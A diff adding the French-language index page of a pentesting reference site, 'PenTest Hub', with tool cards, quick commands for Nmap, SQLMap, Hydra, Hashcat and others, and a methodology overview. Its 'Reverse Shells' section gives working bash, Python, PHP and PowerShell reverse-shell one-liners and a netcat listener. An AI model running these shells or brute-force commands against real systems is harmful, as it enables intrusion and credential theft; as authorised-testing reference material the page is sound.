@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PenTest Hub — Steveny</title>
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="navbar-brand">
+    <span class="bracket">[</span>PenTest Hub<span class="bracket">]</span>
+  </div>
+  <div class="navbar-nav">
+    <a href="index.html" class="active">Dashboard</a>
+    <a href="tools/nmap.html">Nmap</a>
+    <a href="tools/wireshark.html">Wireshark</a>
+    <a href="tools/sqlmap.html">SQLMap</a>
+    <a href="tools/john.html">John</a>
+    <a href="tools/google-dorks.html">Dorks</a>
+    <a href="tools/osint.html">OSINT</a>
+    <a href="tools/netcat.html">Netcat</a>
+  </div>
+  <div class="navbar-search">
+    <input type="text" id="searchInput" class="search-input" placeholder="$ rechercher un outil...">
+  </div>
+</nav>
+
+<section class="hero">
+  <div class="hero-badge">⚡ Usage légal uniquement — réseaux autorisés</div>
+  <h1>Votre <span>Pentesting</span> Hub</h1>
+  <p>Cheatsheets, générateurs de commandes, et références complètes pour tous vos tests d'intrusion autorisés.</p>
+  <div class="hero-stats">
+    <div class="hero-stat"><div class="num">15+</div><div class="label">Outils</div></div>
+    <div class="hero-stat"><div class="num">200+</div><div class="label">Commandes</div></div>
+    <div class="hero-stat"><div class="num">6</div><div class="label">Catégories</div></div>
+    <div class="hero-stat"><div class="num">∞</div><div class="label">Dorks</div></div>
+  </div>
+</section>
+
+<div class="container">
+
+  <div class="info-box warning">
+    <span class="info-box-icon">⚠️</span>
+    <div class="info-box-text">
+      <strong>Avertissement légal :</strong> Ces outils sont destinés exclusivement aux tests sur des réseaux et systèmes dont vous êtes propriétaire ou pour lesquels vous avez une autorisation écrite explicite. Toute utilisation non autorisée est illégale.
+    </div>
+  </div>
+
+  <section class="section">
+    <div class="section-title"><span class="icon">🔧</span> Outils de Pentesting</div>
+    <p class="section-subtitle">Cliquez sur "Cheatsheet" pour accéder aux commandes détaillées et générateurs interactifs.</p>
+
+    <div class="category-tabs">
+      <button class="tab-btn active" data-cat="all">Tous</button>
+      <button class="tab-btn" data-cat="network">Réseau</button>
+      <button class="tab-btn" data-cat="web">Web App</button>
+      <button class="tab-btn" data-cat="password">Passwords</button>
+      <button class="tab-btn" data-cat="osint">OSINT</button>
+      <button class="tab-btn" data-cat="exploit">Exploitation</button>
+      <button class="tab-btn" data-cat="wireless">Wireless</button>
+    </div>
+
+    <div class="tools-grid">
+
+      <!-- NMAP -->
+      <div class="tool-card" data-cat="network" style="--accent-color: #39d353;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🗺️</div>
+          <div class="tool-badges">
+            <span class="badge badge-green">Réseau</span>
+            <span class="badge badge-blue">Scanner</span>
+          </div>
+        </div>
+        <div class="tool-name">Nmap</div>
+        <div class="tool-desc">Découverte d'hôtes, scan de ports, identification de services et OS. L'outil incontournable du pentesteur.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">nmap -sS -sV -O -p- &lt;cible&gt;</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/nmap.html" class="tool-link primary">⚡ Cheatsheet</a>
+          <a href="https://nmap.org/book/man.html" target="_blank" class="tool-link">📖 Docs</a>
+        </div>
+      </div>
+
+      <!-- WIRESHARK -->
+      <div class="tool-card" data-cat="network" style="--accent-color: #58a6ff;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🦈</div>
+          <div class="tool-badges">
+            <span class="badge badge-blue">Réseau</span>
+            <span class="badge badge-purple">Analyse</span>
+          </div>
+        </div>
+        <div class="tool-name">Wireshark</div>
+        <div class="tool-desc">Analyseur de protocole réseau pour capturer et examiner le trafic en temps réel. Filtres BPF & display filters.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">wireshark -i eth0 -k -w capture.pcap</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/wireshark.html" class="tool-link primary">⚡ Cheatsheet</a>
+          <a href="https://www.wireshark.org/docs/" target="_blank" class="tool-link">📖 Docs</a>
+        </div>
+      </div>
+
+      <!-- NETCAT -->
+      <div class="tool-card" data-cat="network" style="--accent-color: #f78166;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🔗</div>
+          <div class="tool-badges">
+            <span class="badge badge-orange">Réseau</span>
+            <span class="badge badge-red">Shells</span>
+          </div>
+        </div>
+        <div class="tool-name">Netcat (nc)</div>
+        <div class="tool-desc">Le "couteau suisse" du réseau. Connexions TCP/UDP, reverse shells, transferts de fichiers, port scanning.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">nc -lvnp 4444</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/netcat.html" class="tool-link primary">⚡ Cheatsheet</a>
+        </div>
+      </div>
+
+      <!-- SQLMAP -->
+      <div class="tool-card" data-cat="web" style="--accent-color: #e3b341;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">💉</div>
+          <div class="tool-badges">
+            <span class="badge badge-yellow">Web</span>
+            <span class="badge badge-red">SQLi</span>
+          </div>
+        </div>
+        <div class="tool-name">SQLMap</div>
+        <div class="tool-desc">Détection et exploitation automatique des injections SQL. Dump de BDD, bypass WAF, lecture/écriture de fichiers.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">sqlmap -u "http://target/?id=1" --dbs</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/sqlmap.html" class="tool-link primary">⚡ Cheatsheet</a>
+          <a href="https://github.com/sqlmapproject/sqlmap/wiki" target="_blank" class="tool-link">📖 Docs</a>
+        </div>
+      </div>
+
+      <!-- JOHN THE RIPPER -->
+      <div class="tool-card" data-cat="password" style="--accent-color: #ff4444;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🔑</div>
+          <div class="tool-badges">
+            <span class="badge badge-red">Password</span>
+            <span class="badge badge-orange">Hash</span>
+          </div>
+        </div>
+        <div class="tool-name">John the Ripper</div>
+        <div class="tool-desc">Cracking de mots de passe et hashes (MD5, SHA, NTLM, bcrypt…). Attaques par dictionnaire, brute force et règles.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">john --wordlist=rockyou.txt hashes.txt</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/john.html" class="tool-link primary">⚡ Cheatsheet</a>
+          <a href="https://www.openwall.com/john/doc/" target="_blank" class="tool-link">📖 Docs</a>
+        </div>
+      </div>
+
+      <!-- GOOGLE DORKS -->
+      <div class="tool-card" data-cat="osint" style="--accent-color: #bc8cff;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🔍</div>
+          <div class="tool-badges">
+            <span class="badge badge-purple">OSINT</span>
+            <span class="badge badge-blue">Recon</span>
+          </div>
+        </div>
+        <div class="tool-name">Google Dorks</div>
+        <div class="tool-desc">Opérateurs de recherche avancés pour trouver des informations sensibles exposées publiquement (GHDB).</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">g:</span> <span class="cmd-text">site:target.com filetype:pdf intext:"password"</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/google-dorks.html" class="tool-link primary">⚡ Générateur</a>
+        </div>
+      </div>
+
+      <!-- THEHARVESTER -->
+      <div class="tool-card" data-cat="osint" style="--accent-color: #bc8cff;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🌾</div>
+          <div class="tool-badges">
+            <span class="badge badge-purple">OSINT</span>
+            <span class="badge badge-green">Email</span>
+          </div>
+        </div>
+        <div class="tool-name">theHarvester</div>
+        <div class="tool-desc">Collecte emails, sous-domaines, IPs et noms depuis sources publiques (Google, Shodan, LinkedIn, etc.).</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">theHarvester -d target.com -b google</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/osint.html" class="tool-link primary">⚡ Cheatsheet</a>
+        </div>
+      </div>
+
+      <!-- SPIDER / CRAWLING -->
+      <div class="tool-card" data-cat="web" style="--accent-color: #f78166;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🕷️</div>
+          <div class="tool-badges">
+            <span class="badge badge-orange">Web</span>
+            <span class="badge badge-blue">Crawl</span>
+          </div>
+        </div>
+        <div class="tool-name">Spider / Crawlers</div>
+        <div class="tool-desc">Gobuster, Dirb, Feroxbuster pour la découverte de répertoires. Scrapy / hakrawler pour le crawling web complet.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">gobuster dir -u http://target -w wordlist.txt</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/spider.html" class="tool-link primary">⚡ Cheatsheet</a>
+        </div>
+      </div>
+
+      <!-- METASPLOIT -->
+      <div class="tool-card" data-cat="exploit" style="--accent-color: #ff4444;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🚀</div>
+          <div class="tool-badges">
+            <span class="badge badge-red">Exploit</span>
+            <span class="badge badge-orange">Framework</span>
+          </div>
+        </div>
+        <div class="tool-name">Metasploit</div>
+        <div class="tool-desc">Framework d'exploitation complet. Modules d'exploit, payloads, post-exploitation, meterpreter, sessions.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">msf&gt;</span> <span class="cmd-text">use exploit/multi/handler</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/metasploit.html" class="tool-link primary">⚡ Cheatsheet</a>
+          <a href="https://docs.metasploit.com/" target="_blank" class="tool-link">📖 Docs</a>
+        </div>
+      </div>
+
+      <!-- HYDRA -->
+      <div class="tool-card" data-cat="password" style="--accent-color: #ff4444;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🐍</div>
+          <div class="tool-badges">
+            <span class="badge badge-red">Password</span>
+            <span class="badge badge-blue">Bruteforce</span>
+          </div>
+        </div>
+        <div class="tool-name">Hydra</div>
+        <div class="tool-desc">Brute force rapide sur protocoles réseau : SSH, FTP, HTTP, SMB, RDP, MySQL et 50+ autres services.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">hydra -l admin -P rockyou.txt ssh://&lt;ip&gt;</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/hydra.html" class="tool-link primary">⚡ Cheatsheet</a>
+        </div>
+      </div>
+
+      <!-- HASHCAT -->
+      <div class="tool-card" data-cat="password" style="--accent-color: #e3b341;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">⚡</div>
+          <div class="tool-badges">
+            <span class="badge badge-yellow">Password</span>
+            <span class="badge badge-purple">GPU</span>
+          </div>
+        </div>
+        <div class="tool-name">Hashcat</div>
+        <div class="tool-desc">Cracking de hashes accéléré GPU. Supporte 300+ types de hashes, attaques mask, combo, hybride.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">hashcat -m 0 -a 0 hash.txt rockyou.txt</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/hashcat.html" class="tool-link primary">⚡ Cheatsheet</a>
+        </div>
+      </div>
+
+      <!-- NIKTO -->
+      <div class="tool-card" data-cat="web" style="--accent-color: #58a6ff;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🔎</div>
+          <div class="tool-badges">
+            <span class="badge badge-blue">Web</span>
+            <span class="badge badge-orange">Scanner</span>
+          </div>
+        </div>
+        <div class="tool-name">Nikto</div>
+        <div class="tool-desc">Scanner de vulnérabilités web. Détecte fichiers dangereux, mauvaises configs, versions obsolètes, injections XSS.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">nikto -h http://target.com -o report.html</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/nikto.html" class="tool-link primary">⚡ Cheatsheet</a>
+        </div>
+      </div>
+
+      <!-- BURP SUITE -->
+      <div class="tool-card" data-cat="web" style="--accent-color: #e3b341;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🔥</div>
+          <div class="tool-badges">
+            <span class="badge badge-yellow">Web</span>
+            <span class="badge badge-red">Proxy</span>
+          </div>
+        </div>
+        <div class="tool-name">Burp Suite</div>
+        <div class="tool-desc">Proxy HTTP intercept, scanner de vulnérabilités web, intruder, repeater, decoder. Référence du pentest web.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">java -jar burpsuite_community.jar</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/burpsuite.html" class="tool-link primary">⚡ Cheatsheet</a>
+          <a href="https://portswigger.net/burp/documentation" target="_blank" class="tool-link">📖 Docs</a>
+        </div>
+      </div>
+
+      <!-- AIRCRACK-NG -->
+      <div class="tool-card" data-cat="wireless" style="--accent-color: #bc8cff;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">📡</div>
+          <div class="tool-badges">
+            <span class="badge badge-purple">Wireless</span>
+            <span class="badge badge-red">WPA</span>
+          </div>
+        </div>
+        <div class="tool-name">Aircrack-ng</div>
+        <div class="tool-desc">Suite complète pour l'audit WiFi : capture de handshakes WPA, cracking, injection de paquets, déauthentification.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">airmon-ng start wlan0</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/aircrack.html" class="tool-link primary">⚡ Cheatsheet</a>
+        </div>
+      </div>
+
+      <!-- ENUM4LINUX / SMBCLIENT -->
+      <div class="tool-card" data-cat="network" style="--accent-color: #f78166;">
+        <div class="tool-card-header">
+          <div class="tool-icon-wrap">🪟</div>
+          <div class="tool-badges">
+            <span class="badge badge-orange">Windows</span>
+            <span class="badge badge-blue">SMB</span>
+          </div>
+        </div>
+        <div class="tool-name">Enum4linux / SMB</div>
+        <div class="tool-desc">Énumération Windows/Samba : utilisateurs, partages, politique de mots de passe, groupes, domaines LDAP.</div>
+        <div class="tool-quick-cmd">
+          <span><span class="prompt">$</span> <span class="cmd-text">enum4linux -a &lt;ip&gt;</span></span>
+          <button class="copy-btn" title="Copier">⎘</button>
+        </div>
+        <div class="tool-links">
+          <a href="tools/windows-enum.html" class="tool-link primary">⚡ Cheatsheet</a>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- QUICK REFERENCE -->
+  <section class="section">
+    <div class="section-title"><span class="icon">⚡</span> Référence rapide — Reverse Shells</div>
+    <p class="section-subtitle">Commandes essentielles pour établir des connexions. Remplacez IP et PORT par vos valeurs.</p>
+    <div class="code-block">
+      <div class="code-block-header">
+        <span class="code-block-title">bash / sh / python / php / powershell</span>
+        <button class="code-block-copy">⎘ Copier</button>
+      </div>
+      <pre><code><span class="cmd-comment"># Bash reverse shell</span>
+bash -i >& /dev/tcp/<span class="cmd-value">IP</span>/<span class="cmd-value">PORT</span> 0>&1
+
+<span class="cmd-comment"># Python 3</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<span class="cmd-value">IP</span>",<span class="cmd-value">PORT</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+
+<span class="cmd-comment"># PHP</span>
+php -r '$s=fsockopen("<span class="cmd-value">IP</span>",<span class="cmd-value">PORT</span>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+<span class="cmd-comment"># PowerShell (Windows)</span>
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<span class="cmd-value">IP</span>',<span class="cmd-value">PORT</span>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}"
+
+<span class="cmd-comment"># Listener Netcat</span>
+nc <span class="cmd-flag">-lvnp</span> <span class="cmd-value">PORT</span>
+
+<span class="cmd-comment"># Upgrade shell TTY</span>
+python3 -c <span class="cmd-string">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="cmd-comment"># Ctrl+Z puis :</span>
+stty raw -echo; fg</code></pre>
+    </div>
+  </section>
+
+  <!-- METHODOLOGIE -->
+  <section class="section">
+    <div class="section-title"><span class="icon">📋</span> Méthodologie Pentest</div>
+    <p class="section-subtitle">Les 5 phases standard d'un test d'intrusion.</p>
+    <div class="tools-grid" style="grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));">
+      <div class="tool-card" style="--accent-color: #bc8cff; text-align:center;">
+        <div style="font-size:32px; margin-bottom:8px;">1️⃣</div>
+        <div class="tool-name" style="font-size:14px;">Reconnaissance</div>
+        <div class="tool-desc">OSINT, Shodan, theHarvester, Google Dorks, WHOIS, DNS</div>
+      </div>
+      <div class="tool-card" style="--accent-color: #58a6ff; text-align:center;">
+        <div style="font-size:32px; margin-bottom:8px;">2️⃣</div>
+        <div class="tool-name" style="font-size:14px;">Scan & Énumération</div>
+        <div class="tool-desc">Nmap, Nikto, Enum4linux, SMBclient, Gobuster, Dirb</div>
+      </div>
+      <div class="tool-card" style="--accent-color: #e3b341; text-align:center;">
+        <div style="font-size:32px; margin-bottom:8px;">3️⃣</div>
+        <div class="tool-name" style="font-size:14px;">Exploitation</div>
+        <div class="tool-desc">Metasploit, SQLMap, Burp Suite, exploits manuels</div>
+      </div>
+      <div class="tool-card" style="--accent-color: #f78166; text-align:center;">
+        <div style="font-size:32px; margin-bottom:8px;">4️⃣</div>
+        <div class="tool-name" style="font-size:14px;">Post-Exploitation</div>
+        <div class="tool-desc">Privilege escalation, persistence, pivoting, dump credentials</div>
+      </div>
+      <div class="tool-card" style="--accent-color: #39d353; text-align:center;">
+        <div style="font-size:32px; margin-bottom:8px;">5️⃣</div>
+        <div class="tool-name" style="font-size:14px;">Rapport</div>
+        <div class="tool-desc">Documentation des vulnérabilités, CVSS scoring, recommandations</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- RESSOURCES -->
+  <section class="section">
+    <div class="section-title"><span class="icon">📚</span> Ressources & Plateformes</div>
+    <div class="tools-grid" style="grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));">
+      <div class="tool-card">
+        <div class="tool-name">🎯 TryHackMe</div>
+        <div class="tool-desc">Apprentissage guidé avec des rooms de CTF et parcours structurés pour débutants et experts.</div>
+        <div class="tool-links"><a href="https://tryhackme.com" target="_blank" class="tool-link primary">Accéder</a></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">⚔️ HackTheBox</div>
+        <div class="tool-desc">Machines réalistes, challenges et CTF pour s'entraîner dans un environnement légal et contrôlé.</div>
+        <div class="tool-links"><a href="https://hackthebox.com" target="_blank" class="tool-link primary">Accéder</a></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">🧪 VulnHub</div>
+        <div class="tool-desc">VMs vulnérables à télécharger et tester localement. Idéal pour la pratique hors-ligne.</div>
+        <div class="tool-links"><a href="https://vulnhub.com" target="_blank" class="tool-link primary">Accéder</a></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">📡 Shodan</div>
+        <div class="tool-desc">Moteur de recherche pour les appareils connectés à Internet. Indispensable pour la reconnaissance.</div>
+        <div class="tool-links"><a href="https://shodan.io" target="_blank" class="tool-link primary">Accéder</a></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">🕵️ GHDB</div>
+        <div class="tool-desc">Google Hacking Database — base de données de dorks pour trouver des infos sensibles exposées.</div>
+        <div class="tool-links"><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" class="tool-link primary">Accéder</a></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">💣 Exploit-DB</div>
+        <div class="tool-desc">Base de données publique d'exploits et de vulnérabilités, maintenue par Offensive Security.</div>
+        <div class="tool-links"><a href="https://exploit-db.com" target="_blank" class="tool-link primary">Accéder</a></div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <span>[PenTest Hub]</span> — Usage légal uniquement | © Steveny
+</footer>
+
+<div id="toast" class="toast"></div>
+<script src="js/main.js"></script>
+</body>
+</html>
